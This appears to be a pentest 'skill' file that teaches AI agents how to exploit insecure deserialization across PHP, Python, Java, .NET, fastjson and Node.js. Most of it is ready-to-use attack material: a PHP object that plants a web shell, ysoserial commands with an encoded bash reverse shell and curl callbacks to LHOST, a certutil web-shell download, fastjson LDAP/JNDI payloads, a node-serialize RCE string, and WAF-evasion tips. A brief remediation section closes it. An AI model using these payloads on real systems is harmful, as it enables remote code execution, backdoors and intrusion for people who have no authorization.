---
name: deserialization
description: Exploit insecure deserialization — PHP OOP/pickle/PHAR, Python pickle, Java readObject + ysoserial gadget chains, Ruby Marshal, .NET ViewState/Json.NET/fastjson, and Node.js node-serialize.
---

# Insecure Deserialization

## When to use this skill

Use when the app deserializes user-controlled data: cookies, session files, base64 blobs in params, POST bodies, ViewState, signed tokens, import/upload features. Goal ladder: identify serialized format → identify library/runtime version → find gadget chains → RCE, file write, SSRF, file read, auth bypass.

## Methodology

### 1. Identify the format & library

| Format | Magic bytes / markers | Runtime sink |
|---|---|---|
| PHP serialized object | `O:4:"User":2:{...}` / `a:1:{` / `s:4:"name"` | PHP `unserialize()` |
| PHP PHAR | `__HALT_COMPILER();` in file; `phar://` stream wrapper | `unserialize()` via `phar://`, `file_exists('phar://...')` |
| Python pickle | `\x80\x03` (proto 3), `\x80\x04`, `\x80\x05`; base64 `gASV` (proto 2/3/4) | Python `pickle.loads()`, `yaml.load(...,Loader=yaml.Loader)` |
| Java | `AC ED 00 05` magic; base64 `rO0AB`; gzip `H4sI` | `ObjectInputStream.readObject()` |
| Ruby Marshal | `\x04\x08` magic (base64 `BP..`) | Ruby `Marshal.load` |
| .NET ViewState | base64 starting `/wEP`, `/wPg`, `__VIEWSTATE` + `__VIEWSTATEMAC` / `__VIEWSTATEGENERATOR` | ASP.NET `LosFormatter` / `ObjectStateFormatter` |
| .NET Json.NET | `{"$type":"Namespace.Class, Assembly",...}` | Newtonsoft `TypeNameHandling.All/Auto/Objects` |
| Java Jackson | `["com.pkg.Class",{...}]` (enableDefaultTyping) or `@class` | Jackson databind polymorphic typing |
| fastjson | `{"@type":"com.sun.rowset.JdbcRowSetImpl",...}` | fastjson `autoType` |
| XStream | `<com.pkg.Class><field>...</field></com.pkg.Class>` XML | XStream ≤1.4.x |
| Node.js | `{"rce":"_$$ND_FUNC$$_function(){...}()"}` | `node-serialize`, `funcster` |

Decode helpers: `echo '<base64>' | base64 -d | xxd | head`, CyberChef Magic, `file`, `binwalk`.

### 2. Map the object graph (PHP / Ruby / Python)

```php
// PHP: mirror the server class names & property names exactly
class FileService { public $logFile = '/var/www/html/shell.php'; public $logData = '<?php system($_GET[0]);?>'; }
echo urlencode(serialize(new FileService));
// property visibility matters: protected => "\0*\0prop", private => "\0Class\0prop"
```

Useful PHP magic methods to hunt in source / popular frameworks (PHPGGC covers many): `__destruct`, `__wakeup`, `__toString`, `__call`, `__get`, `__callStatic`, `__set_state`. PHPGGC: `phpggc -l`, `phpggc Guzzle/RCE1 system 'id'`, `-b` for base64, `-p` phar, `-u` URL-encode, `--fast-destruct`.

Python: any `__reduce__`/`__reduce_ex__` in the pickle executes at load: `pickle.dumps(RCE(), protocol=2)`. If blocked by a restricted unpickler, hunt opcode abuse (`REDUCE`, `BUILD`, `INST`, `OBJ`, `STACK_GLOBAL` with allowed modules), or `yaml` tags `!!python/object/apply:os.system ["cmd"]`.

Ruby Marshal: `o: Gem::SpecFication`-style gem gadget chains (ruby payload generator / `jvm` gadget). Ruby ≥2.7 hardened `Marshal` for some gadgets.

### 3. Java gadget chains (ysoserial)

```bash
java -jar ysoserial.jar CommonsCollections5 'curl http://LHOST:8000/pwn' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwL0wxMC4wLjAuMS85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}' > pay.ser
ysoserial CommonsCollections4 / CommonsCollections5 / CC6 / CCK1..CCK12 (if CCShiro/etc. present)
ysoserial CommonsBeanutils1, Spring1/2, Hibernate1, JSON1, Jdk7u21, JRMPClient (blind/egress-only), URLDNS (DNS-only probe)
```
- **URLDNS** first: confirms deserialization + DNS egress silently, no noisy execution.
- Classpath mismatch → try `CommonsCollectionsKcio*`, `Spring`, `Groovy`, `Rome`, `BeanShell`, `Vaadin`, `Wicket`, `BlazDS`, `Click`, `Weld`, `JBoss`, `MozillaRhino`.
- Shiro `rememberMe` cookie = `AES-CBC/GCM(default key kPH+bIxk5D2deZiIxcaaA==) + base64(serialize(payload))` — use `ShiroExploit`/`ysoserial` with known keys.
- JMX/RMI/JNDI endpoints → `java.rmi`, LDAP `marshalsec` (see `ldap-injection`).

### 4. .NET ViewState / Json.NET / fastjson

- **ViewState**:
  - No MAC (`enableViewStateMac=false`) or ASP.NET <4.5.2 w/ known machineKey → craft with **ysoserial.net**: `ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd" --path=/page.aspx --appath=/ --classpage=... --validationalg=SHA1 --validationkey=... --decryptionalg=AES --decryptionkey=...`
  - MachineKey leak (web.config read / GitHub commit / `/web.config.bak`) → forge valid ViewState = RCE.
  - Padding-oracle (CVE-2020-0688, Exchange; `__VIEWSTATEGENERATOR` + default machineKey) → use `ysoserial.net -c "certutil -urlcache -f http://LHOST/s.aspx C:\\inetpub\\wwwroot\\s.aspx"`.
  - MAC enabled but no integrity needed: try **JS ViewState deserialization** (Json.NET types) → gadget `ObjectDataProvider`/`WindowsIdentity`.
- **Json.NET**: `{"$type":"System.Diagnostics.Process, System","StartInfo":{"FileName":"cmd","Arguments":"/c calc"}}`; gadgets: `ObjectDataProvider`, `WindowsIdentity`, `TempFileCollection`, `PSObject`.
- **fastjson**: `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://LHOST:1389/Exploit","autoCommit":true}`; also `JndiDataSourceFactory`, `InitialContext`, `BCEL` classload variants for fastjson ≤1.2.68 (`{"@type":"java.lang.AutoCloseable"...C3P0/BCEL...}`).

### 5. Node.js / other runtimes

```js
// node-serialize: function is serialized as _$$ND_FUNC$$_code ; add () to self-invoke
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://LHOST:8000/pwn',function(){})}()"}
```
- Ruby on Rails cookie serializer: `Marshal.load` on `session` cookie (`_appname_session`) if signed-cookie secret_key_base leaked → gadget chain via `ruby deserialization gadget` (`Net::Write`, `ERB`, `ActiveSupport`). Rails 4.1+ uses JSON by default.
- Groovy/XStream/XStream1.4.x: `<map><entry><com.sun.rowset.JdbcRowSetImpl>...` for LDAP; `<dynamic-proxy>` for SSRF.

### 6. Tools & references

- **ysoserial** (Java): https://github.com/frohoff/ysoserial
- **ysoserial.net** (.NET / ViewState): https://github.com/pwntester/ysoserial.net
- **PHPGGC**: https://github.com/ambionics/phpggc
- **marshalsec**: https://github.com/mbechler/marshalsec
- **ysoserial-modified / CCK12**: for obscure/patched gadget classes
- **GadgetProbe / GadgetInspector** for unknown gadget chains
- IppSec / gynvael write-ups on `pickle`, `phar`, `ViewState` for deep chains.

## Exploitation tips

- Deserialization payloads almost always need to be **URL- or base64-encoded twice** or nested inside another format (JSON string, cookie, XML CDATA) — verify by decoding the final request.
- Confirm deserialization before RCE: send **URLDNS** (Java) / `O:8:"stdClass":0:{}` (PHP) / `\x80\x04\x95` garbage (Python) / corrupt ViewState and observe error-path changes.
- PHP PHAR trick: any filesystem function (`file_exists`, `is_dir`, `fopen`, `getimagesize`, `md5_file`) with `phar://` in the path triggers `unserialize` — upload a polyglot image-PHAR (`phpggc -p phar`).
- Blind/no-output: use out-of-band callbacks — DNS (`URLDNS`, `java.rmi`), HTTP (`curl`/`wget`), LDAP (`marshalsec`), SMB (Responder on Windows) — and check listener logs.
- WAFs/inputs stripping `;`/`{`/`}`: use alternate serializers (PHP `php_serialize`/`igbinary`), Java `XStream` XML, Python `cereal`/`msgpack`-like gadget chains, .NET `ObjectStateFormatter` vs `LosFormatter`.
- Keep the payload **small**: many cookies/headers have size limits (4 KB/8 KB) — use a stager that writes/loads a second-stage, or classpath-short gadget variants (CC6 > CC1 length-wise; ysoserial `-Dsize` for minimized variants via `ysoserial` "small" forks).

## Remediation

- Never deserialize untrusted data — prefer JSON with strict schemas (Jackson `disableDefaultTyping`, Json.NET `TypeNameHandling.None`).
- PHP: `unserialize($data, ['allowed_classes' => false])` / `json_decode` instead.
- Python: `json` over `pickle`; if unavoidable, ` RestrictedUnpickler` with a strict allow-list; `yaml.safe_load`.
- Rotate/protect machineKey & `secret_key_base`; never commit them. Patch PHP/Java/Jackson/fastjson/XStream versions (they are usually the entry vector).
- Sign serialized blobs with HMAC before deserializing (still exploitable if key leaks — do not rely on it).
- Egress-filter app servers so gadget chains can't phone home (limits DNS/HTTP/LDAP callbacks).

## Verification & Deliverables
A complete engagement run of this skill produces:
- Fingerprint evidence: magic bytes/content-type/format detected per endpoint.
- Gadget chain identified (library + versions + chain name, e.g. ysoserial payload) matching the runtime.
- Command-execution proof via out-of-band callback (DNS/HTTP hit to your listener containing command output) or in-band response.
- Escalation achieved where applicable (file write, auth bypass via object substitution, RCE).
- Remediation: deserialization disabled/ replaced with safe formats, integrity signing, allowlists, dependency upgrades — re-tested.
If any artifact is missing, the test is incomplete — return to the corresponding methodology step.
